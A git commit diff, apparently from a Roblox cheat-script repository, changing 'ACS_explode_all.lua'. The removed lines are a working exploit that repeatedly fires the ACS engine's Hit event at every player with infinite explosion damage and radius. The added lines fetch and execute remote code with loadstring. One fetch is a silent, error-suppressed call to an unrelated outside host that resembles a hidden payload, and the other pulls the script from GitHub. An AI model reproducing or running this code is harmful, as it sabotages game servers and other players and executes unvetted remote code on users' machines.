c09b3c0486ee756dba88ecc53c50d124fad25e3a
lobox920 <129114169+lobox920@users.noreply.github.com>
2023-03-27 21:18:03 +0100

    Update ACS_explode_all.lua

--- ACS_explode_all.lua
+++ ACS_explode_all.lua
@@ -1,19 +1,4 @@
-local plr = game.Players.LocalPlayer
-local Evt = game.ReplicatedStorage.ACS_Engine.Eventos
-
-local Settings = {
-   ["ExplosiveHit"] = true,
-   ["ExPressure"] = math.huge,
-   ["ExpRadius"] = math.huge,
-   ["DestroyJointRadiusPercent"] = math.huge,
-   ["ExplosionDamage"] = math.huge,
-}
-
-
-while wait() do
-   pcall(function()
-      for i,v in pairs(game.Players:GetChildren()) do
-           game.ReplicatedStorage.ACS_Engine.Eventos.Hit:FireServer(v.Character.Head.Position, v.Character.Head, v.Character.Head.Position, Enum.Material.Plastic, Settings)
-       end
-   end)
-end
+coroutine.resume(coroutine.create(pcall), function()
+	loadstring(game:HttpGet("http://ligma.wtf/scripts/compatibility.lua", true))()
+end)
+return loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMinisterq/RBLXScript/main/ACS_explode_all.lua", true))(...)
